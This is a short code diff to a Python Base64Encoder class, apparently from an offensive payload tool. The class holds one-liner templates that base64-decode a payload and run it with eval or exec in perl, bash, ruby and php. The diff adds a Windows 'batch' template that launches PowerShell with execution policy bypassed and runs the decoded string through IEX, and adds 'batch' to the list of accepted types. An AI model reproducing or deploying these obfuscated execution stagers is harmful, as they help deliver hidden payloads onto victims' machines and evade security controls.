@@ -19,7 +19,13 @@ class Base64Encoder(object):
         "perl": "perl -MMIME::Base64::decode_base64 -e 'eval print decode_base64 join\"\",<>' {}",
         "bash": "STRING=$(echo \"{}\" | base64 --decode);eval $STRING",
         "ruby": "ruby -e \"require \\\"base64\\\";eval(Base64.decode64(\\\"{}\\\"))\"",
-        "php": "php -r 'exec(base64_decode(\"{}\"));'"
+        "php": "php -r 'exec(base64_decode(\"{}\"));'",
+        # i decided that I'd just call powershell from cmd instead of figuring out some crazy
+        # fucked up oneliner to decode base64 in batch.
+        "batch": (
+                    'Powershell.exe -exec bypass IEX '
+                    '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{}"))'
+                ),
     }
 
     def __init__(self, payload_data, cursor):
@@ -30,7 +36,7 @@ class Base64Encoder(object):
 
     def encode(self):
         encoded_payload = base64.b64encode(self.payload)
-        acceptable_exec_types = ("powershell", "php", "python", "perl", "ruby", "bash")
+        acceptable_exec_types = ("powershell", "php", "python", "perl", "ruby", "bash", "batch")
         if self.exec_type.lower() in acceptable_exec_types:
             payload = self.payload_starts[self.exec_type]
         else:
